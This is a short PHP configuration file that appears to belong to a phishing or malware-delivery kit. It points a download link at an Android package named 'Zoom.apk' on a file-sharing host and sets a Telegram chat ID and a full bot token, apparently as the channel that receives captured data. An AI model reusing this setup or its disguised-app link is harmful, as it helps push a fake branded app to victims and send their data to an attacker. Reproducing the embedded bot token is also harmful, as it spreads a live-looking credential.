<?php
$android		= 'https://cold8.gofile.io/download/direct/ea3eb181-e53f-4df9-9e93-d681d2e1577d/Zoom.apk';
$settings = array(
	
	
	"telegram"			=> "1",
	"chat_id"			=> "-4272157069",
	"bot_url"			=> "bot6758514135:AAEAEjOOddrKMHgnrLRkePUpMO4OcVN2L3k",
	
);

return $settings;
?>